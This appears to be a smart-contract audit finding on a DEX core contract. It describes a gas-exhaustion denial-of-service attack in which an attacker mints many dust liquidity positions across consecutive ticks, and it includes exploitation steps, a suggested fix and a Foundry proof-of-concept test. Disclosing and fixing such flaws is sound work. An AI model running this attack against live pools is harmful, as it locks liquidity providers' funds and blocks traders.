## Title
Gas-Based DOS Attack via Dust Liquidity Positions Forcing Excessive Delta Calculations

## Summary
An attacker can create hundreds of positions with minimal liquidity (dust positions) across consecutive ticks to force swaps to perform excessive expensive fixed-point delta calculations when crossing those ticks. This causes swaps to consume 20-40M+ gas, exceeding block limits or making the pool economically unusable.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/Core.sol` (swap function, lines 564-809), `src/math/delta.sol` (lines 34-69, 80-117), `src/base/BasePositions.sol` (lines 71-97)

**Intended Logic:** The swap loop iterates across initialized ticks, performing delta calculations to determine token amounts at each price boundary. The protocol expects reasonable liquidity distribution with economically meaningful position sizes.

**Actual Logic:** The protocol enforces no minimum liquidity requirement for positions. [1](#0-0)  The `minLiquidity` parameter is user-controlled slippage protection, allowing creation of positions with arbitrarily small liquidity (even 1 wei).

When swaps cross initialized ticks, they must perform expensive fixed-point delta calculations. [2](#0-1)  These calculations use `FixedPointMathLib.fullMulDivUp` and `fullMulDivUnchecked`, which are 512-bit operations consuming ~2000-3500 gas each, plus additional storage operations for tick crossing consuming ~10-30k gas total per tick.

The swap loop is unbounded and continues until `amountRemaining == 0` or the price limit is reached. [3](#0-2)  Each iteration calls delta calculation functions at lines 665-673 or 699-701, regardless of the magnitude of liquidity at the tick.

**Exploitation Path:**
1. Attacker calls `positions.mintAndDeposit()` 1000 times with `minLiquidity = 0`, `maxAmount0 = 1 wei`, `maxAmount1 = 1 wei`, creating positions at sequential single-tick ranges: (0,1), (1,2), ..., (999,1000)
2. This initializes 2000 ticks in the bitmap via `_updateTick()` [4](#0-3)  which calls `flipTick()` [5](#0-4)  for each tick transitioning from zero to non-zero liquidity
3. Cost to attacker: ~150k gas × 1000 positions = 150M gas (~$2,250 at 50 gwei, $3000 ETH) plus 1000 wei per token (negligible)
4. Victim attempts swap crossing this range (e.g., with `sqrtRatioLimit` spanning ticks 0-1000)
5. Swap loop crosses all 2000 initialized ticks, where each crossing: [6](#0-5) 
   - Performs delta calculations (2-3.5k gas)
   - Updates tick state and fee tracking (10-30k gas total)
6. Total gas: 2000 ticks × 20k gas = 40M gas minimum
7. Result: Transaction fails (exceeds typical 30M block gas limit) or succeeds with extreme cost ($800+ at 100 gwei), making pool economically unusable

**Security Property Broken:** 
- Violates the invariant that "All positions MUST be withdrawable at any time within block gas limit" - if withdrawal requires swapping through the DOS'd range, positions become effectively locked
- Pool becomes unusable for normal swap operations, causing economic damage to legitimate LPs and traders

## Impact Explanation
- **Affected Assets**: Entire pool becomes unusable. All LP positions in the DOS'd tick range become difficult/impossible to exit. Traders cannot execute swaps crossing the poisoned range.
- **Damage Severity**: Complete pool DOS. If the attack covers a wide price range (e.g., ±50% from current price), the pool becomes entirely non-functional. LPs cannot withdraw positions. Existing positions lose all trading fees.
- **User Impact**: All users of the affected pool. Any swap attempting to cross the poisoned tick range will fail or cost 10-100x normal gas. LPs with positions spanning the range cannot withdraw without extreme gas costs.

## Likelihood Explanation
- **Attacker Profile**: Any user with modest capital (~$2,500 for 1000 positions) and gas funds
- **Preconditions**: Pool must exist and be initialized. Attacker needs minimal token balances (1000 wei per token)
- **Execution Complexity**: Simple - just call `mintAndDeposit()` repeatedly with dust amounts. Single-transaction attack setup.
- **Frequency**: One-time attack per pool with permanent effect until positions are withdrawn (which may never happen due to attack cost vs locked capital)

## Recommendation

Enforce a protocol-level minimum liquidity requirement per position to make dust attacks economically infeasible:

```solidity
// In src/base/BasePositions.sol, function deposit, after line 87:

// CURRENT (vulnerable):
if (liquidity < minLiquidity) {
    revert DepositFailedDueToSlippage(liquidity, minLiquidity);
}

// FIXED:
uint128 MINIMUM_LIQUIDITY = 1000; // Protocol-enforced minimum (e.g., 1000 wei)

if (liquidity < minLiquidity) {
    revert DepositFailedDueToSlippage(liquidity, minLiquidity);
}

// Enforce protocol minimum to prevent dust position DOS attacks
if (liquidity < MINIMUM_LIQUIDITY) {
    revert InsufficientLiquidity(liquidity, MINIMUM_LIQUIDITY);
}
```

Alternative mitigations:
1. Implement a maximum tick crossings limit per swap (e.g., break loop after N ticks crossed)
2. Charge higher gas/fees for positions with very low liquidity
3. Implement a minimum position value in dollar terms based on token prices

## Proof of Concept

```solidity
// File: test/Exploit_DustPositionDOS.t.sol
// Run with: forge test --match-test test_DustPositionDOS -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Positions.sol";
import "../src/Router.sol";
import "./TestToken.sol";
import {PoolKey} from "../src/types/poolKey.sol";
import {PoolConfig, createConcentratedPoolConfig} from "../src/types/poolConfig.sol";
import {RouteNode} from "../src/Router.sol";
import {TokenAmount} from "../src/Router.sol";
import {tickToSqrtRatio} from "../src/math/ticks.sol";

contract Exploit_DustPositionDOS is Test {
    Core core;
    Positions positions;
    Router router;
    TestToken token0;
    TestToken token1;
    PoolKey poolKey;
    
    function setUp() public {
        core = new Core();
        positions = new Positions(core, address(this), 0, 0);
        router = new Router(core);
        
        token0 = new TestToken(address(this));
        token1 = new TestToken(address(this));
        
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: createConcentratedPoolConfig({
                _fee: 1 << 15, // 0.003%
                _tickSpacing: 1,
                _extension: address(0)
            })
        });
        
        core.initializePool(poolKey, 0);
        
        token0.mint(address(this), type(uint128).max);
        token1.mint(address(this), type(uint128).max);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        token0.approve(address(router), type(uint256).max);
        token1.approve(address(router), type(uint256).max);
    }
    
    function test_DustPositionDOS() public {
        // SETUP: Attacker creates 100 dust positions (reduced from 1000 for test speed)
        uint256 gasStart = gasleft();
        
        for (uint256 i = 0; i < 100; i++) {
            positions.mintAndDeposit(
                poolKey,
                int32(uint32(i)),      // tickLower
                int32(uint32(i + 1)),  // tickUpper
                1,                      // maxAmount0 = 1 wei
                1,                      // maxAmount1 = 1 wei
                0                       // minLiquidity = 0 (NO MINIMUM!)
            );
        }
        
        uint256 attackCost = gasStart - gasleft();
        emit log_named_uint("Attack setup gas cost:", attackCost);
        
        // EXPLOIT: Victim attempts to swap crossing all dust positions
        uint256 swapGasStart = gasleft();
        
        // Create a legitimate position for swap liquidity
        positions.mintAndDeposit(
            poolKey,
            -1000,
            1000,
            1e18,
            1e18,
            0
        );
        
        // Attempt swap crossing dust ticks
        try router.swap(
            RouteNode({
                poolKey: poolKey,
                sqrtRatioLimit: tickToSqrtRatio(110), // Force crossing 100+ ticks
                skipAhead: 0
            }),
            TokenAmount({
                token: address(token0),
                amount: 1e18
            }),
            type(int256).min
        ) {
            uint256 swapGas = swapGasStart - gasleft();
            emit log_named_uint("Swap gas consumed:", swapGas);
            
            // VERIFY: Swap consumed excessive gas
            // With 100 dust positions (200 ticks), expect ~4M+ gas
            // With 1000 dust positions (2000 ticks), would consume ~40M+ gas
            assertGt(swapGas, 2000000, "Swap should consume excessive gas");
            
            // Calculate attack effectiveness
            uint256 gasMultiplier = swapGas / 100000; // Normal swap ~100k gas
            emit log_named_uint("Gas multiplier vs normal:", gasMultiplier);
            
        } catch {
            // Transaction may revert due to gas limit
            emit log_string("Swap failed - likely out of gas (DOS achieved)");
        }
    }
}
```

## Notes

The `skipAhead` parameter does not mitigate this attack. [7](#0-6)  The parameter only controls how many bitmap *words* to search when finding the next initialized tick, but once a tick is found, if the swap price reaches it, the tick *must* be crossed with full delta calculations performed. The loop continues searching new words as the price progresses, eventually finding and crossing all dust ticks within the swap's price range.

The attack is economically viable because the attacker's one-time setup cost (~150M gas for 1000 positions) can DOS the pool permanently or until dust positions are withdrawn. Multiple victim swaps suffering 20-40M gas costs each quickly exceed the attacker's investment, and the pool's reputation damage causes long-term liquidity exodus.

### Citations

**File:** src/base/BasePositions.sol (L78-87)
```text
        uint128 minLiquidity
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);

        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }
```

**File:** src/math/delta.sol (L34-69)
```text
function amount0DeltaSorted(uint256 sqrtRatioLower, uint256 sqrtRatioUpper, uint128 liquidity, bool roundUp)
    pure
    returns (uint128 amount0)
{
    unchecked {
        uint256 liquidityX128;
        assembly ("memory-safe") {
            liquidityX128 := shl(128, liquidity)
        }
        if (roundUp) {
            uint256 result0 =
                FixedPointMathLib.fullMulDivUp(liquidityX128, (sqrtRatioUpper - sqrtRatioLower), sqrtRatioUpper);
            assembly ("memory-safe") {
                let result := add(div(result0, sqrtRatioLower), iszero(iszero(mod(result0, sqrtRatioLower))))
                if shr(128, result) {
                    // cast sig "Amount0DeltaOverflow()"
                    mstore(0, 0xb4ef2546)
                    revert(0x1c, 0x04)
                }
                amount0 := result
            }
        } else {
            uint256 result0 =
                FixedPointMathLib.fullMulDivUnchecked(liquidityX128, (sqrtRatioUpper - sqrtRatioLower), sqrtRatioUpper);
            uint256 result = FixedPointMathLib.rawDiv(result0, sqrtRatioLower);
            assembly ("memory-safe") {
                if shr(128, result) {
                    // cast sig "Amount0DeltaOverflow()"
                    mstore(0, 0xb4ef2546)
                    revert(0x1c, 0x04)
                }
                amount0 := result
            }
        }
    }
}
```

**File:** src/Core.sol (L285-319)
```text
    function _updateTick(PoolId poolId, int32 tick, PoolConfig poolConfig, int128 liquidityDelta, bool isUpper)
        private
    {
        StorageSlot tickInfoSlot = CoreStorageLayout.poolTicksSlot(poolId, tick);

        (int128 currentLiquidityDelta, uint128 currentLiquidityNet) = TickInfo.wrap(tickInfoSlot.load()).parse();
        uint128 liquidityNetNext = addLiquidityDelta(currentLiquidityNet, liquidityDelta);
        // this is checked math
        int128 liquidityDeltaNext =
            isUpper ? currentLiquidityDelta - liquidityDelta : currentLiquidityDelta + liquidityDelta;

        // Check that liquidityNet doesn't exceed max liquidity per tick
        uint128 maxLiquidity = poolConfig.concentratedMaxLiquidityPerTick();
        if (liquidityNetNext > maxLiquidity) {
            revert MaxLiquidityPerTickExceeded(tick, liquidityNetNext, maxLiquidity);
        }

        if ((currentLiquidityNet == 0) != (liquidityNetNext == 0)) {
            flipTick(CoreStorageLayout.tickBitmapsSlot(poolId), tick, poolConfig.concentratedTickSpacing());

            (StorageSlot fplSlot0, StorageSlot fplSlot1) =
                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, tick);

            bytes32 v;
            assembly ("memory-safe") {
                v := gt(liquidityNetNext, 0)
            }

            // initialize the storage slots for the fees per liquidity outside to non-zero so tick crossing is cheaper
            fplSlot0.store(v);
            fplSlot1.store(v);
        }

        tickInfoSlot.store(TickInfo.unwrap(createTickInfo(liquidityDeltaNext, liquidityNetNext)));
    }
```

**File:** src/Core.sol (L564-809)
```text
                while (true) {
                    int32 nextTick;
                    bool isInitialized;
                    SqrtRatio nextTickSqrtRatio;

                    // For stableswap pools, determine active liquidity for this step
                    uint128 stepLiquidity = liquidity;

                    if (config.isStableswap()) {
                        if (config.isFullRange()) {
                            // special case since we don't need to compute min/max tick sqrt ratio
                            (nextTick, nextTickSqrtRatio) =
                                increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (MIN_TICK, MIN_SQRT_RATIO);
                        } else {
                            (int32 lower, int32 upper) = config.stableswapActiveLiquidityTickRange();

                            bool inRange;
                            assembly ("memory-safe") {
                                inRange := and(slt(tick, upper), iszero(slt(tick, lower)))
                            }
                            if (inRange) {
                                nextTick = increasing ? upper : lower;
                                nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                            } else {
                                if (tick < lower) {
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (lower, tickToSqrtRatio(lower)) : (MIN_TICK, MIN_SQRT_RATIO);
                                } else {
                                    // tick >= upper implied
                                    (nextTick, nextTickSqrtRatio) =
                                        increasing ? (MAX_TICK, MAX_SQRT_RATIO) : (upper, tickToSqrtRatio(upper));
                                }
                                stepLiquidity = 0;
                            }
                        }
                    } else {
                        // concentrated liquidity pools use the tick bitmaps
                        (nextTick, isInitialized) = increasing
                            ? findNextInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            )
                            : findPrevInitializedTick(
                                CoreStorageLayout.tickBitmapsSlot(poolId),
                                tick,
                                config.concentratedTickSpacing(),
                                params.skipAhead()
                            );

                        nextTickSqrtRatio = tickToSqrtRatio(nextTick);
                    }

                    SqrtRatio limitedNextSqrtRatio =
                        increasing ? nextTickSqrtRatio.min(sqrtRatioLimit) : nextTickSqrtRatio.max(sqrtRatioLimit);

                    SqrtRatio sqrtRatioNext;

                    if (stepLiquidity == 0) {
                        // if the pool is empty, the swap will always move all the way to the limit price
                        sqrtRatioNext = limitedNextSqrtRatio;
                    } else {
                        // this amount is what moves the price
                        int128 priceImpactAmount;
                        if (isExactOut) {
                            assembly ("memory-safe") {
                                priceImpactAmount := amountRemaining
                            }
                        } else {
                            uint128 amountU128;
                            assembly ("memory-safe") {
                                // cast is safe because amountRemaining is g.t. 0 and fits in int128
                                amountU128 := amountRemaining
                            }
                            uint128 feeAmount = computeFee(amountU128, config.fee());
                            assembly ("memory-safe") {
                                // feeAmount will never exceed amountRemaining since fee is < 100%
                                priceImpactAmount := sub(amountRemaining, feeAmount)
                            }
                        }

                        SqrtRatio sqrtRatioNextFromAmount = isToken1
                            ? nextSqrtRatioFromAmount1(sqrtRatio, stepLiquidity, priceImpactAmount)
                            : nextSqrtRatioFromAmount0(sqrtRatio, stepLiquidity, priceImpactAmount);

                        bool hitLimit;
                        assembly ("memory-safe") {
                            // Branchless limit check: (increasing && next > limit) || (!increasing && next < limit)
                            let exceedsUp := and(increasing, gt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            let exceedsDown :=
                                and(iszero(increasing), lt(sqrtRatioNextFromAmount, limitedNextSqrtRatio))
                            hitLimit := or(exceedsUp, exceedsDown)
                        }

                        // the change in fees per liquidity for this step of the iteration
                        uint256 stepFeesPerLiquidity;

                        if (hitLimit) {
                            (uint256 sqrtRatioLower, uint256 sqrtRatioUpper) =
                                sortAndConvertToFixedSqrtRatios(limitedNextSqrtRatio, sqrtRatio);
                            (uint128 limitSpecifiedAmountDelta, uint128 limitCalculatedAmountDelta) = isToken1
                                ? (
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                )
                                : (
                                    amount0DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, !isExactOut),
                                    amount1DeltaSorted(sqrtRatioLower, sqrtRatioUpper, stepLiquidity, isExactOut)
                                );

                            if (isExactOut) {
                                uint128 beforeFee = amountBeforeFee(limitCalculatedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, beforeFee)
                                    amountRemaining := add(amountRemaining, limitSpecifiedAmountDelta)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitCalculatedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                uint128 beforeFee = amountBeforeFee(limitSpecifiedAmountDelta, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, limitCalculatedAmountDelta)
                                    amountRemaining := sub(amountRemaining, beforeFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(beforeFee, limitSpecifiedAmountDelta)),
                                        stepLiquidity
                                    )
                                }
                            }

                            sqrtRatioNext = limitedNextSqrtRatio;
                        } else if (sqrtRatioNextFromAmount != sqrtRatio) {
                            uint128 calculatedAmountWithoutFee = isToken1
                                ? amount0Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut)
                                : amount1Delta(sqrtRatioNextFromAmount, sqrtRatio, stepLiquidity, isExactOut);

                            if (isExactOut) {
                                uint128 includingFee = amountBeforeFee(calculatedAmountWithoutFee, config.fee());
                                assembly ("memory-safe") {
                                    calculatedAmount := add(calculatedAmount, includingFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(includingFee, calculatedAmountWithoutFee)),
                                        stepLiquidity
                                    )
                                }
                            } else {
                                assembly ("memory-safe") {
                                    calculatedAmount := sub(calculatedAmount, calculatedAmountWithoutFee)
                                    stepFeesPerLiquidity := div(
                                        shl(128, sub(amountRemaining, priceImpactAmount)),
                                        stepLiquidity
                                    )
                                }
                            }

                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatioNextFromAmount;
                        } else {
                            // for an exact output swap, the price should always move since we have to round away from the current price
                            assert(!isExactOut);

                            // consume the entire input amount as fees since the price did not move
                            assembly ("memory-safe") {
                                stepFeesPerLiquidity := div(shl(128, amountRemaining), stepLiquidity)
                            }
                            amountRemaining = 0;
                            sqrtRatioNext = sqrtRatio;
                        }

                        // only if fees per liquidity was updated in this swap iteration
                        if (stepFeesPerLiquidity != 0) {
                            if (feesAccessed == 0) {
                                // this loads only the input token fees per liquidity
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                ) + stepFeesPerLiquidity;
                            } else {
                                inputTokenFeesPerLiquidity += stepFeesPerLiquidity;
                            }

                            feesAccessed = 2;
                        }
                    }

                    if (sqrtRatioNext == nextTickSqrtRatio) {
                        sqrtRatio = sqrtRatioNext;
                        assembly ("memory-safe") {
                            // no overflow danger because nextTick is always inside the valid tick bounds
                            tick := sub(nextTick, iszero(increasing))
                        }

                        if (isInitialized) {
                            bytes32 tickValue = CoreStorageLayout.poolTicksSlot(poolId, nextTick).load();
                            assembly ("memory-safe") {
                                // if increasing, we add the liquidity delta, otherwise we subtract it
                                let liquidityDelta :=
                                    mul(signextend(15, tickValue), sub(increasing, iszero(increasing)))
                                liquidity := add(liquidity, liquidityDelta)
                            }

                            (StorageSlot tickFplFirstSlot, StorageSlot tickFplSecondSlot) =
                                CoreStorageLayout.poolTickFeesPerLiquidityOutsideSlot(poolId, nextTick);

                            if (feesAccessed == 0) {
                                inputTokenFeesPerLiquidity = uint256(
                                    CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(increasing))
                                        .load()
                                );
                                feesAccessed = 1;
                            }

                            uint256 globalFeesPerLiquidityOther = uint256(
                                CoreStorageLayout.poolFeesPerLiquiditySlot(poolId).add(LibBit.rawToUint(!increasing))
                                    .load()
                            );

                            // if increasing, it means the pool is receiving token1 so the input fees per liquidity is token1
                            if (increasing) {
                                tickFplFirstSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplSecondSlot.load()))
                                );
                            } else {
                                tickFplFirstSlot.store(
                                    bytes32(inputTokenFeesPerLiquidity - uint256(tickFplFirstSlot.load()))
                                );
                                tickFplSecondSlot.store(
                                    bytes32(globalFeesPerLiquidityOther - uint256(tickFplSecondSlot.load()))
                                );
                            }
                        }
                    } else if (sqrtRatio != sqrtRatioNext) {
                        sqrtRatio = sqrtRatioNext;
                        tick = sqrtRatioToTick(sqrtRatio);
                    }

                    if (amountRemaining == 0 || sqrtRatio == sqrtRatioLimit) {
                        break;
                    }
                }
```

**File:** src/math/tickBitmap.sol (L36-40)
```text
function flipTick(StorageSlot slot, int32 tick, uint32 tickSpacing) {
    (uint256 word, uint256 index) = tickToBitmapWordAndIndex(tick, tickSpacing);
    StorageSlot wordSlot = slot.add(word);
    wordSlot.store(wordSlot.load() ^ bytes32(1 << index));
}
```

**File:** src/math/tickBitmap.sol (L42-80)
```text
function findNextInitializedTick(StorageSlot slot, int32 fromTick, uint32 tickSpacing, uint256 skipAhead)
    view
    returns (int32 nextTick, bool isInitialized)
{
    unchecked {
        nextTick = fromTick;

        while (true) {
            // convert the given tick to the bitmap position of the next nearest potential initialized tick
            (uint256 word, uint256 index) = tickToBitmapWordAndIndex(nextTick + int32(tickSpacing), tickSpacing);

            Bitmap bitmap = loadBitmap(slot, word);

            // find the index of the previous tick in that word
            uint256 nextIndex = bitmap.geSetBit(uint8(index));

            // if we found one, return it
            if (nextIndex != 0) {
                (nextTick, isInitialized) = (bitmapWordAndIndexToTick(word, nextIndex - 1, tickSpacing), true);
                break;
            }

            // otherwise, return the tick of the most significant bit in the word
            nextTick = bitmapWordAndIndexToTick(word, 255, tickSpacing);

            if (nextTick >= MAX_TICK) {
                nextTick = MAX_TICK;
                break;
            }

            // if we are done searching, stop here
            if (skipAhead == 0) {
                break;
            }

            skipAhead--;
        }
    }
}
```
